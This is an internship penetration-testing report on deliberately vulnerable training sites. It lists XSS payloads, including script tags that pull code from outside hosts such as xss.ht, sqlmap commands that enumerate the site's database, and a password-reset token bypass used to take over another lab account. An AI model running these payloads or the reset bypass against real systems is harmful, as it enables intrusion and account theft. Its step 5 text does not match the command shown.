# CODTECH-Task2


# WEB APPLICATION PENETRATION TESTING
# Personal information

* Name : Patel Mihir

* Company : CODTECH IT SOLUTIONS PVT.LTD

* ID : CT08DAB

* Domain : Cyber Security & Ethical Hacking

* Duration: 20th Dec 2024 To 20th Jan 2025

* Mentor : Neela Santhosh kumar

# Overview

* Web Application Penetration Testing involves identifying and exploiting security vulnerabilities in web applications to ensure they are secure against potential attacks. This process focuses on vulnerabilities like SQL injection, cross-site scripting (XSS), and insecure authentication mechanisms.

# objective

1. Identify vulnerabilities
2. Exploit weaknesses to understand potential attacks
3. Recommend remediation to enhance security

# Tools used in web application Testing

- sqlmap
- burpsuite
- nmap
- nikto
- dirb
- owasp zap
- Metasploit Framework
- nessus etc.

# focus vulnerabilities

- cross site scripting (XSS)
- SQL injection
- insecure authentication
- open redirect etc.

# Performed Task
# Details of site where we performed the web application Testing

- Site Name : http://testphp.vulnweb.com
- IP address : 44.228.249.3
- Web server : HTTPServer[nginx/1.19.0]
- technology used : 1. PHP[5.6.40-38+ubuntu20.04.1+deb.sury.org+1] , 2. Script[text/JavaScript]
- Port : 80 [http] open

# Performed Testing on testphp.vulnweb.com

# 1. XSS Vulnerability
Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can execute in the victim's browser, leading to various malicious activities such as stealing cookies, session tokens, or other sensitive information.
step 1 : Now first open the site and write xss payload on serachbar.

    <script>alert("XSS vulnerability found")</script>  
<br> 

    <script>alert(1)</script>    
<br> 

    <script>alert(document.domain.concat("\n").concat(window.origin))</script>    
<br> 

    <img src=x onerror=alert('XSS');>    
<br>  

    "><script src="https://js.rip/<custom.name>"></script>

    "><script src=//<custom.subdomain>.xss.ht></script> 

    <script>$.getScript("//<custom.subdomain>.xss.ht")</script>     

![image](https://github.com/user-attachments/assets/3196a105-0b45-4963-9c20-964b324cb7e7)

![image](https://github.com/user-attachments/assets/52485633-8a3b-4ff2-b6ca-455f0804bc6c)

![image](https://github.com/user-attachments/assets/edee616c-72a9-4a6a-a87c-cdcf1d43a1e8)

![image](https://github.com/user-attachments/assets/7a17a8b9-9223-458f-808d-fc390f367078)

![image](https://github.com/user-attachments/assets/a5345045-a1b2-43e3-8e66-3bf25e328491)

![image](https://github.com/user-attachments/assets/9cf9efb3-c86c-41a2-91a9-328191760fa5)

![image](https://github.com/user-attachments/assets/604a7f82-1248-4790-a447-d610428a1a0f)


# 2. Sql injection
SQL Injection is a critical security vulnerability that allows attackers to manipulate SQL queries by injecting malicious code into input fields, potentially leading to unauthorized access, data theft, or destruction of the database.
![image](https://github.com/user-attachments/assets/15ec2865-08b6-45b5-9040-0d5aded164d7)

we use payload in url and it shows sql error
![image](https://github.com/user-attachments/assets/3a5b5c1a-ddaf-49b6-bc5f-8dd2e4be2483)

![image](https://github.com/user-attachments/assets/ca73eda4-9ef8-40b8-8905-5d8e303efc3f)

- Step 2 : copy The given url.

        http://testphp.vulnweb.com/listproducts.php?cat=1
  <br> 
- Step 3 : open the kali linux terminal.
- Now write the given command for perform SQL injection.

- here -u refers for URL & --dbs for database.

        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs

![image](https://github.com/user-attachments/assets/3da4323e-77d5-4523-9bdf-5ba7c1a26246)

- Now you see that we got a two databases. first is acuart and second is information_schema.

- Now we go to the inner in acuart database.

- Step 4 : Now follow this commnd for find columns in acuart database.

        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --columns


![image](https://github.com/user-attachments/assets/76aa812d-5f24-43fb-b485-bc0e702c659d)

![image](https://github.com/user-attachments/assets/e671b246-b914-41ed-a008-055e9905e180)

![image](https://github.com/user-attachments/assets/b6c52111-9168-4915-bab8-b9f677de7f7b)

- Now you see we got columns of databases.

- step 5 : Retrieve data from the pass column using the following command.

        sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables
![image](https://github.com/user-attachments/assets/7dd547da-39aa-491d-934a-a02722d55e1b)



# 3.Insecure Authentication Mechanism: 
Insecure authentication mechanisms can lead to unauthorized access, data breaches, and various security vulnerabilities. They often involve weak password policies, lack of multi-factor authentication, improper session management, and insecure password storage practices.

- BUG: Password reset broken logic
- Impact: Insecure authentication mechanisms can lead to unauthorized access, data breaches, and compromised sensitive information.
- Step 1: identify the Website 

![image](https://github.com/user-attachments/assets/4521d324-6166-4203-8122-a055a111d624)

- Step 2: Now Click on my account and Open login page
![image](https://github.com/user-attachments/assets/d5a44eaa-ae63-494a-8fef-0429d0d09b84)

- Step 3: Click On Forgot Password and add username wiener
![image](https://github.com/user-attachments/assets/83d73939-b16e-4771-9c7a-3e383afe6423)

- Step 4: Enter username and submit and open email client
![image](https://github.com/user-attachments/assets/e922bcfb-fadd-451e-b2d0-2245d57aab1b)

- Step 5: open link and give new password
![image](https://github.com/user-attachments/assets/777f8836-89bd-422b-9b91-fbb1966c782f)

- Step 6: click on submit and find request in burpsuite http history
![image](https://github.com/user-attachments/assets/61128ccf-d898-4ac2-bb95-f0795d3a1ff6)

- Step 7: Delete token and send request if it goes it’s an insecure authentication because it can’t check token and accept the password change request
![image](https://github.com/user-attachments/assets/8f3b3619-8553-44b7-9195-1021955e06ef)

- Step 8: It will be sent so we can change password of anyone via username change in request
![image](https://github.com/user-attachments/assets/4b739609-552e-4cdf-97f6-1c7305b89555)

- Step 9: We change username wiener to carlos and send the request and the carlos’s password will be change
![image](https://github.com/user-attachments/assets/27310a04-4990-4ee3-b047-b1cabd13f1d7)

- Step 10: We try to login in carlos’s account via new password
![image](https://github.com/user-attachments/assets/a8a127b6-d90e-4ccc-8e66-e48389431a6b)


It will successfully login in carlos’s account
